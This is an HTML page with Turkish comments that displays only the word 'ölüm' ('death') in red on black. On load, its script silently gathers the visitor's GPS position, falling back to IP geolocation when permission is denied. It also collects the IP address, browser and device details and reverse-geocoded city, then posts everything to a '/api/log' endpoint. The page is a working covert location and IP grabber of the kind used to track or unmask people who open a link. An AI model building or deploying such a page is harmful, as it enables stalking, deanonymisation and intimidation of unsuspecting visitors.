<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: black;
      color: red;
      font-size: 50px;
      font-weight: bold;
      text-align: center;
    }
  </style>
</head>
<body>
  ölüm

  <script>
    // 1) IP tabanlı konum sorgusu (fallback)
    async function getIPLocation() {
      try {
        // ip-api.com -> JSON yanıt döndürür
        // Ücretsiz sürümü HTTP olabilir; HTTPS'te çalışmayabilir. Alternatif: "https://ipwho.is/" vb.
        const res = await fetch('http://ip-api.com/json/');
        const data = await res.json();
        // Örnek yanıt:
        // {
        //   "status":"success",
        //   "country":"United States",
        //   "countryCode":"US",
        //   "region":"CA",
        //   "regionName":"California",
        //   "city":"San Francisco",
        //   "lat":37.7749,
        //   "lon":-122.4194,
        //   "query":"xxx.xxx.xxx.xxx"
        // }
        if (data.status === "success") {
          return {
            ip: data.query || "Bilinmeyen IP",
            latitude: data.lat || null,
            longitude: data.lon || null,
            city: data.city || "Bilinmeyen",
            country: data.country || "Bilinmeyen"
          };
        } else {
          // "fail" durumunda
          return null;
        }
      } catch (error) {
        console.error("IP tabanlı konum alınırken hata oluştu:", error);
        return null;
      }
    }

    // 2) Kullanıcının gerçek IP'sini (api64.ipify.org) almak için (isteğe bağlı)
    async function getUserIP() {
      try {
        const res = await fetch('https://api64.ipify.org?format=json'); 
        const data = await res.json();
        return data.ip;
      } catch (error) {
        console.error("IP alınırken hata oluştu:", error);
        return "Bilinmeyen";
      }
    }

    // 3) Enlem/boylam -> şehir/ülke (Nominatim) (GPS konumu için)
    async function getLocationFromCoords(latitude, longitude) {
      try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
        const data = await res.json();

        const country = data.address?.country || "Bilinmeyen";
        const city = data.address?.city || data.address?.town || data.address?.village || "Bilinmeyen";
        return { country, city };
      } catch (error) {
        console.error("GPS konum alınırken hata oluştu:", error);
        return { country: "Bilinmeyen", city: "Bilinmeyen" };
      }
    }

    // 4) Yüksek hassasiyetle tarayıcı konumunu iste -> Başarısızsa IP fallback
    function getGPSLocationWithFallback() {
      return new Promise(async (resolve) => {
        // Tarayıcı geolocation destekliyorsa:
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              // Başarılı: GPS'ten enlem-boylam aldık
              const latitude = position.coords.latitude;
              const longitude = position.coords.longitude;
              // Nominatim'den şehir/ülke
              const loc = await getLocationFromCoords(latitude, longitude);
              resolve({
                success: true,
                latitude,
                longitude,
                city: loc.city,
                country: loc.country
              });
            },
            async (error) => {
              console.warn("Konum izni reddedildi veya hata oluştu:", error);
              // HATA -> IP tabanlı konuma fallback
              const ipLoc = await getIPLocation();
              if (ipLoc) {
                resolve({
                  success: false,
                  latitude: ipLoc.latitude,
                  longitude: ipLoc.longitude,
                  city: ipLoc.city,
                  country: ipLoc.country,
                  ip: ipLoc.ip
                });
              } else {
                // IP de alınamadıysa
                resolve(null);
              }
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
        } else {
          console.error("Tarayıcı geolocation API'sini desteklemiyor. IP tabanlı konuma geçiliyor.");
          // Geolocation desteklenmiyorsa IP fallback
          const ipLoc = await getIPLocation();
          if (ipLoc) {
            resolve({
              success: false,
              latitude: ipLoc.latitude,
              longitude: ipLoc.longitude,
              city: ipLoc.city,
              country: ipLoc.country,
              ip: ipLoc.ip
            });
          } else {
            resolve(null);
          }
        }
      });
    }

    // 5) Tüm verileri birleştirip sunucuya gönder
    async function sendData() {
      // Tarayıcı konumu veya IP fallback
      const locationData = await getGPSLocationWithFallback();

      // "Gerçek IP" sorgusu (isteğe bağlı). IP tabanlı konumla gelen IP ile farklı olabilir.
      const userIP = await getUserIP();

      // Varsayılan
      let finalLocation = "Konum alınamadı";
      let lat = null;
      let lon = null;

      if (locationData) {
        // "Şehir, Ülke" formatı
        finalLocation = `${locationData.city}, ${locationData.country}`;
        lat = locationData.latitude;
        lon = locationData.longitude;
      }

      let userData = {
        ip: userIP,  // ipify'den gelen IP
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: screen.width,
        screenHeight: screen.height,
        language: navigator.language,
        location: finalLocation,
        latitude: lat,
        longitude: lon
      };

      // Sunucuya POST
      fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userData)
      });
    }

    // Sayfa açıldığında çalıştır
    sendData();
  </script>
</body>
</html>
